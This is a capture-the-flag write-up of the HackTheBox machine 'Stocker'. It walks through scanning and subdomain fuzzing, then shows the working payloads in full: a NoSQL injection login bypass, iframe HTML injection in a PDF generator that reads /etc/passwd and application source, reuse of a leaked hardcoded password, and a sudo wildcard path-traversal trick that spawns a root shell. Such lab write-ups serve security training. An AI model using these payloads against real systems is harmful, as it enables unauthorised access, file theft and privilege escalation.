---
layout: post
title: Stocker - HackTheBox
date: 21/01/2023
author: Nehal Zaman
tags: ["nosql injection", "arbitrary file read", "nodejs"]
categories: [writeups]
render_with_liquid: false
---

![](/assets/images/writeups/stocker/banner.png)

# INTRODUCTION

**Stocker** is a nice and straight-forward box created by [JoshSH](https://www.hackthebox.com/home/users/profile/269501) on [HackTheBox](https://www.hackthebox.com/home).

It involves exploiting an injection vulnerability, followed by an arbitrary file read vulnerability leading to retrieval of sensitive information that gives access to the box.

Finally, root on this box is obtained by exploiting a misconfigured sudo permission.

# SCANNING

```bash

┌──(n3hal㉿Universe7)-[~]
└─$ rustscan -a 10.10.11.196 -r 1-65535 --ulimit 5000                           
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/n3hal/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.11.196:22
Open 10.10.11.196:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-21 01:31 EST
Initiating Ping Scan at 01:31
Scanning 10.10.11.196 [2 ports]
Completed Ping Scan at 01:31, 0.26s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 01:31
Completed Parallel DNS resolution of 1 host. at 01:31, 13.00s elapsed
DNS resolution of 1 IPs took 13.00s. Mode: Async [#: 1, OK: 0, NX: 0, DR: 1, SF: 0, TR: 3, CN: 0]
Initiating Connect Scan at 01:31
Scanning 10.10.11.196 [2 ports]
Discovered open port 22/tcp on 10.10.11.196
Discovered open port 80/tcp on 10.10.11.196
Completed Connect Scan at 01:31, 0.28s elapsed (2 total ports)
Nmap scan report for 10.10.11.196
Host is up, received syn-ack (0.26s latency).
Scanned at 2023-01-21 01:31:43 EST for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.73 seconds

```

A quick rustscan reveals port **22** and **80** to be open on the box.

```bash

┌──(n3hal㉿Universe7)-[~]
└─$ nmap -sC -sV -p22,80 10.10.11.196                  
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-21 01:33 EST
Nmap scan report for 10.10.11.196
Host is up (1.0s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3d:12:97:1d:86:bc:16:16:83:60:8f:4f:06:e6:d5:4e (RSA)
|   256 7c:4d:1a:78:68:ce:12:00:df:49:10:37:f9:ad:17:4f (ECDSA)
|_  256 dd:97:80:50:a5:ba:cd:7d:55:e8:27:ed:28:fd:aa:3b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://stocker.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.53 seconds

```

Obviously, there is **SSH** service on port 22 and **web** service on port 80.

NMAP scan also reveals a domain name `stocker.htb`. It is required to add it to the `/etc/hosts`.

```bash

┌──(n3hal㉿Universe7)-[~]
└─$ nmap -sC -sV -p80 stocker.htb
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-21 01:38 EST
Nmap scan report for stocker.htb (10.10.11.196)
Host is up (1.0s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-generator: Eleventy v2.0.0
|_http-title: Stock - Coming Soon!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.05 seconds

```

# ENUMERATING WEB

![](/assets/images/writeups/stocker/1.png)

The website seems to be a static site with no signs of user interaction that can be exploitted.

```bash

┌──(n3hal㉿Universe7)-[~]
└─$ wfuzz -c -u http://stocker.htb/FUZZ -w /usr/share/wordlists/dirb/big.txt --hc 404
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://stocker.htb/FUZZ
Total requests: 20469

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                               
=====================================================================

000005517:   301        7 L      12 W       178 Ch      "css"                                                                                                                                 
000007427:   200        0 L      4 W        1150 Ch     "favicon.ico"                                                                                                                         
000007795:   301        7 L      12 W       178 Ch      "fonts"                                                                                                                               
000009464:   301        7 L      12 W       178 Ch      "img"                                                                                                                                 
000010190:   301        7 L      12 W       178 Ch      "js"                                                                                                                                  

Total time: 2419.557
Processed Requests: 20469
Filtered Requests: 20464
Requests/sec.: 8.459812

```

Directory fuzzing did not reveal anything interesting here.

# SUBDOMAIN ENUMERATION

```bash

┌──(n3hal㉿Universe7)-[~]
└─$ wfuzz -c -w /home/n3hal/Tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.stocker.htb' --hw 12 -f subs.txt 10.10.11.196
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.196/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                               
=====================================================================

000000019:   302        0 L      4 W        28 Ch       "dev"                                                                                                                                 

Total time: 289.9951
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 17.20373

```

Subdomain fuzzing with `SecLists`'s `subdomains-top1million-5000.txt` reveals a subdomain `dev`.

It is required to add `dev.stocker.htb` to `/etc/hosts` file.

# BACK TO WEB ENUMERATION

![](/assets/images/writeups/stocker/2.png)

When requesting the homepage of `http://dev.stocker.htb/`, we are redirected to a login page at `/login`.

Default credentails like `admin:admin`, `admin:password`, `admin:stocker`, `stocker:stocker`, `stockeradmin:stockeradmin` etc. does not work here.

So if we are required to get past this login page, it is definitely got to be a server side vulnerability here.

# DISCOVERING NOSQL INJECTION 

The obvious vulnerability when it comes to a login page situation is `injection` related vulnerability.

Common SQL injection payloads for authentication bypass does not provide any results here. SQLmap can also be used for detecting SQL injection if at all it is vulnerable to this.

However, the server side response headers reveal that we have an `Express` application here.

Hence, it would be more useful if we test for `NoSQLi` instead of traditional SQL injection.

```bash

POST /login HTTP/1.1
Host: dev.stocker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: http://dev.stocker.htb
Connection: close
Referer: http://dev.stocker.htb/login
Cookie: connect.sid=s%3AbJDgribzFlsxX6bWGc2SXpNYUW4JptWX.mZxgaHsLBo3x1QVe%2BJ0dWssycRJ6jSJkOelyyA2%2Fd9A
Upgrade-Insecure-Requests: 1

username=admin&password=admin

```

```html

HTTP/1.1 302 Found
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 21 Jan 2023 07:53:56 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 92
Connection: close
X-Powered-By: Express
Location: /login?error=login-error
Vary: Accept

<p>Found. Redirecting to <a href="/login?error=login-error">/login?error=login-error</a></p>

```

A normal login request with `admin:admin` as credentials responds with a `302` status code and redirects us back to `/login` with the `error` parameter. Well, this is expected as the credentials are not right.

```bash

POST /login HTTP/1.1
Host: dev.stocker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 49
Origin: http://dev.stocker.htb
Connection: close
Referer: http://dev.stocker.htb/login
Cookie: connect.sid=s%3AbJDgribzFlsxX6bWGc2SXpNYUW4JptWX.mZxgaHsLBo3x1QVe%2BJ0dWssycRJ6jSJkOelyyA2%2Fd9A
Upgrade-Insecure-Requests: 1

{"username":{"$ne": "x"},"password":{"$ne": "y"}}

```

```html

HTTP/1.1 302 Found
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 21 Jan 2023 07:58:16 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 56
Connection: close
X-Powered-By: Express
Location: /stock
Vary: Accept

<p>Found. Redirecting to <a href="/stock">/stock</a></p>

```

Now, here are few things worth noting:

- In the request, the `Content-Type` is changed to `application/json`.
- In the request body, a JSON object is being sent instead of URL-encoded POST parameters.
- What is most important here, is the content that are being sent in JSON object.

If the application supports injecting arbitrary objects/dictionaries in the user-controllable part, a malicious user can inject sub-dictionaries containing NoSQL operators which can lead to the manipulation of the logic of NoSQL query.

Here, the `username` key has value `{"$ne": "x"}`. The `$ne` is basically a NoSQL operator meaning `not equal to`. So the logic is something like _**find the user whose username is not equal to 'x'**_. The similar thing can be explained for `password` field.

Obviously, there must not be any user whose `username` is `x` and password is `y`. So the backend query should return valid user details, and we must be able to authenticate ourselves, which is evident from the response redirection to `/stock` instead of `/login`.

Hence, here is a NoSQL injection which is used to bypass authentication.

# DISCOVERING ARBITRARY FILE READ VULNERABILITY

Upon logged in, a user is redirected to `/stock`.

![](/assets/images/writeups/stocker/3.png)

It is basically a shop website, where a user can add some objects to basket, view his basket and then checkout.

![](/assets/images/writeups/stocker/4.png)

After checking out, a PDF is generated detailing the purchase history of the user.

The PDF reflects the `name` of the product and the `price`.

![](/assets/images/writeups/stocker/5.png)

Now this is interesting for us.

```bash

POST /api/order HTTP/1.1
Host: dev.stocker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://dev.stocker.htb/stock
Content-Type: application/json
Origin: http://dev.stocker.htb
Content-Length: 195
Connection: close
Cookie: connect.sid=s%3AbJDgribzFlsxX6bWGc2SXpNYUW4JptWX.mZxgaHsLBo3x1QVe%2BJ0dWssycRJ6jSJkOelyyA2%2Fd9A

{"basket":[{"_id":"638f116eeb060210cbd83a8d","title":"<h1><u>Nehal Hacks For Good</u></h1>","description":"It's a red cup.","image":"red-cup.jpg","price":32,"currentStock":4,"__v":0,"amount":1}]}

```

```html

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 21 Jan 2023 08:21:27 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 53
Connection: close
X-Powered-By: Express
ETag: W/"35-Tzjn01Rk42SDueMgKwQNQcjXLvw"

{"success":true,"orderId":"63cba087436910054f762153"}

```

While making an order, the `title` key's value is changed to `<h1><u>Nehal Hacks For Good</u></h1>`. 

In the response, the `id` of generated pdf is sent.

![](/assets/images/writeups/stocker/6.png)

It is seen that the injected HTML tags are successfully rendered. So we can inject arbitrary HTML tags now.

HTML injections can be escalated to arbitrary file read vulnerability through the `iframe` tags. The source of the `iframe` must be the name of the file we want to read.

```html

<iframe frameborder='0' height='750' scrolling='no' src='/etc/passwd' width='750'></iframe>

```

```bash

POST /api/order HTTP/1.1
Host: dev.stocker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://dev.stocker.htb/stock
Content-Type: application/json
Origin: http://dev.stocker.htb
Content-Length: 250
Connection: close
Cookie: connect.sid=s%3AbJDgribzFlsxX6bWGc2SXpNYUW4JptWX.mZxgaHsLBo3x1QVe%2BJ0dWssycRJ6jSJkOelyyA2%2Fd9A

{"basket":[{"_id":"638f116eeb060210cbd83a8d","title":"<iframe frameborder='0' height='750' scrolling='no' src='/etc/passwd' width='750'></iframe>","description":"It's a red cup.","image":"red-cup.jpg","price":32,"currentStock":4,"__v":0,"amount":1}]}

```

![](/assets/images/writeups/stocker/7.png)

The source of the `iframe` is `/etc/passwd`, and in the PDF we can see the contents of `/etc/passwd`.

The box has a user called `angoose`.

# RETRIEVING SENSITIVE INFORMATION

Using the arbitrary file read, we can not read the `SSH` keys of the user. 

In such cases, it is useful to read source code of the application to find any hardcoded secrets.

But for that, we first need to leak the path of the source code.

That can be easily done by simply invoking an error.

```bash

POST /api/order HTTP/1.1
Host: dev.stocker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://dev.stocker.htb/stock
Content-Type: application/json
Origin: http://dev.stocker.htb
Content-Length: 10
Connection: close
Cookie: connect.sid=s%3AbJDgribzFlsxX6bWGc2SXpNYUW4JptWX.mZxgaHsLBo3x1QVe%2BJ0dWssycRJ6jSJkOelyyA2%2Fd9A

{"basket":

```

```html

HTTP/1.1 400 Bad Request
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 21 Jan 2023 08:38:55 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 953
Connection: close
X-Powered-By: Express
Content-Security-Policy: default-src 'none'
X-Content-Type-Options: nosniff

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>SyntaxError: Unexpected end of JSON input<br> &nbsp; &nbsp;at JSON.parse (&lt;anonymous&gt;)<br> &nbsp; &nbsp;at parse (/var/www/dev/node_modules/body-parser/lib/types/json.js:89:19)<br> &nbsp; &nbsp;at /var/www/dev/node_modules/body-parser/lib/read.js:128:18<br> &nbsp; &nbsp;at AsyncResource.runInAsyncScope (node:async_hooks:203:9)<br> &nbsp; &nbsp;at invokeCallback (/var/www/dev/node_modules/raw-body/index.js:231:16)<br> &nbsp; &nbsp;at done (/var/www/dev/node_modules/raw-body/index.js:220:7)<br> &nbsp; &nbsp;at IncomingMessage.onEnd (/var/www/dev/node_modules/raw-body/index.js:280:7)<br> &nbsp; &nbsp;at IncomingMessage.emit (node:events:513:28)<br> &nbsp; &nbsp;at endReadableNT (node:internal/streams/readable:1359:12)<br> &nbsp; &nbsp;at process.processTicksAndRejections (node:internal/process/task_queues:82:21)</pre>
</body>
</html>

```

In the order request, a malformed JSON object is sent. Obviously the server spits some errors.

The error contains the path of the application which is at: `/var/www/dev`.

Now, we also need to know the name of the server application. Commonly developers tend to use names like `index.js`, `app.js` or sometimes `server.js`.

Luckily, `index.js` works, and we can see the source code of the application.

```bash

POST /api/order HTTP/1.1
Host: dev.stocker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://dev.stocker.htb/stock
Content-Type: application/json
Origin: http://dev.stocker.htb
Content-Length: 260
Connection: close
Cookie: connect.sid=s%3AeswVmx8Xj3fWdbDyZkXnmL7Trz4KD0ED.CQnWD9TtWWM2AA%2BD4WHqa61FXdp8WsIdCGiQ22dK8V0

{"basket":[{"_id":"638f116eeb060210cbd83a8d","title":"<iframe frameborder='0' height='750' scrolling='no' src='/var/www/dev/index.js' width='750'></iframe>","description":"It's a red cup.","image":"red-cup.jpg","price":32,"currentStock":4,"__v":0,"amount":1}]}

```

![](/assets/images/writeups/stocker/8.png)

In the database connection string, hardcoded credentials can be seen, `dev:IHeardPassphrasesArePrettySecure`.

# SHELL AS ANGOOSE

We have a valid username `angoose` and a possible credential `IHeardPassphrasesArePrettySecure` from `index.js`. 

If the user reuses the same credentials for SSH, we will be able to login to the box via SSH on port 22.

```bash

┌──(n3hal㉿Universe7)-[~]
└─$ ssh angoose@stocker.htb
angoose@stocker.htb's password: 

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

angoose@stocker:~$ id; whoami
uid=1001(angoose) gid=1001(angoose) groups=1001(angoose)
angoose

```

We are successful in logging in to the box.

# PRIVILEGE ESCALATION TO ROOT

```bash

angoose@stocker:~$ sudo -l
[sudo] password for angoose: 
Matching Defaults entries for angoose on stocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js

```

The current user can run any javascript script which is supposed to be in `/usr/local/scripts` with superuser permissions.

But note that we have a wildcard here.

With the wildcard, we can potentially use dot-dot-slash sequences to iterate through any arbitrary directory and run node scripts from any directory we can control.

```bash

angoose@stocker:~$ cat /tmp/curiosity.js 
console.log("I can run any script from any directory with root permissions")
angoose@stocker:~$ 
angoose@stocker:~$ sudo /usr/bin/node /usr/local/scripts/../../../tmp/curiosity.js 
I can run any script from any directory with root permissions

```

To demonstrate what I said above, I have created a simple JS script in `/tmp`.

Then I used `../` sequences to iterate from `/usr/local/scripts` to `/tmp/curiosity.js`. Since I ran the node script with `sudo` we are able to run it with elevated privileges.

```bash

angoose@stocker:~$ cat /tmp/curiosity.js 
require("child_process").spawn("/bin/bash", {stdio: [0, 1, 2]})
angoose@stocker:~$ 
angoose@stocker:~$ sudo /usr/bin/node /usr/local/scripts/../../../tmp/curiosity.js 
root@stocker:/home/angoose# 
root@stocker:/home/angoose# 
root@stocker:/home/angoose# cd
root@stocker:~# id; whoami
uid=0(root) gid=0(root) groups=0(root)
root

```

I have edited the JS script to spawn a `bash` shell. 

So when we run the script again with `sudo`, we got a `root` shell.

# CONCLUSION

As it can be seen, the box is pretty straight-forward. It seems a bit lengthy considering that it is an easy rated box.

The box is all about finding a juicy subdomain, followed by discovering a NoSQL injection vulnerability, an arbitrary file read vulnerability escalated from a simple HTML injection and finally discovering hardcoded reusable credentials. 

The privilege escalation part is also something that can seen as pretty obvious.

So, that is all in this box.

Thanks for reading this far. I hope you liked it.

